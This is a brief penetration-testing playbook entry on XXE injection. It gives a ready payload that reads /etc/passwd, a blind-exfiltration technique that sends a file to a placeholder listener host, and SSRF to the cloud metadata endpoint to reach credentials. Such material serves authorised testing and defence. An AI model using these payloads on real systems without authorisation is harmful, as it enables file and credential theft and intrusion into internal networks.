# XML external entity (XXE)

**Trigger:** an endpoint accepts XML - `Content-Type: application/xml`/`text/xml`, a SOAP action, a `.xml`/SVG/DOCX/XLSX upload, or a request body starting with `<?xml`.

**Action:**
- Inject a DOCTYPE with an external entity and reference it in a returned field:
  `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` - file contents back = XXE file read.
- Blind: point the entity at your out-of-band listener (`SYSTEM "http://you/x"`), or use a parameter entity + external DTD to exfiltrate a file over your listener.
- SSRF via XXE: `SYSTEM "http://169.254.169.254/..."` to reach internal / metadata endpoints.
- Try every XML sink: SOAP, SVG uploads (rendered), office documents, RSS/XML import.

**Confirm:** file contents echoed back, an out-of-band hit, or internal content reached = XXE. Local read of a secret/config, or metadata credentials, is critical.
